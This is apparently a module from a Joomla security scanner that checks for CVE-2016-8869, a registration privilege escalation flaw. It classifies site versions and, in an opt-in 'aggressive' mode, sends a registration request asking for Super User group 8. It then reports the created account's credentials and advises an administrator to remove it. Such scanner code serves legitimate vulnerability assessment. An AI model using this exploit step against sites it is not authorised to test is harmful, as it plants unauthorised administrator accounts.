from __future__ import annotations

from typing import Any

from ...core.versions import parse_version_required, parse_version_safe
from .advisory import passive_core_finding
from .registration_probe import submit_registration

CVE_ID = "CVE-2016-8869"
NAME = "Joomla registration privilege escalation"
AFFECTED_RULE = "Joomla 3.4.4 through 3.6.3"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parsed < parse_version_required("3.4.4"):
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < parse_version_required("3.6.4") else "PATCHED"


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    **kwargs: Any,
):
    finding = passive_core_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        joomla_version=joomla_version,
        classify=classify_version,
        remediation="Upgrade Joomla to 3.6.4 or a currently supported release and audit privileged users.",
    )
    finding.exploit_available = True
    if not run_exploit_check or finding.status != "LIKELY_VULNERABLE":
        return finding
    if exploit_mode != "aggressive":
        finding.detail += " Privileged account creation is mutating and is available only in aggressive mode."
        return finding
    super_user_group = 8
    proof = submit_registration(target_url, group=super_user_group, timeout=timeout, proxy=proxy)
    finding.exploit_ran = proof["sent"]
    finding.proof_url = proof["proof_url"]
    if not proof["sent"]:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "LOW"
        finding.detail = proof["reason"]
    elif proof.get("account_created"):
        finding.status = "LIKELY_VULNERABLE"
        finding.confidence = "HIGH"
        finding.detail = (
            "The corrected registration.register request delivered top-level groups[]=8 and persisted a user, "
            "confirmed by a same-session username/e-mail collision. Group-8 assignment is not externally observable, "
            "so Super User privileges are not claimed as confirmed. "
            f"Disposable candidate: {proof['username']} / {proof['password']} ({proof['email']}); an administrator "
            "must inspect and remove it."
        )
        finding.evidence = {
            "account_created": True,
            "group_requested": super_user_group,
            "group_field": proof.get("group_field"),
            "privilege_confirmed": False,
            "collision_markers": proof.get("collision_markers", []),
        }
    elif proof.get("sent"):
        finding.status = "AGGRESSIVE_SENT"
        finding.confidence = "LOW"
        finding.detail = (
            "The corrected registration.register request with top-level groups[]=8 was sent, but the collision "
            "oracle did not confirm persistence. "
            f"Disposable candidate: {proof['username']} / {proof['password']} ({proof['email']}); collision markers: "
            f"{proof.get('collision_markers', [])}."
        )
    else:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "MEDIUM"
        finding.detail = f"The privileged registration request was rejected (HTTP {proof['status']})."
    return finding


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": "Joomla core",
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": [">=3.4.4,<3.6.4"],
        "exploit_available": True,
        "exploit_modes": ["aggressive"],
        "intrusive": True,
        "module_version": "1.2.0",
        "last_reviewed": "2026-10-03",
        "updated": "2026-10-03",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2016-8869",
            "https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html",
        ],
    }
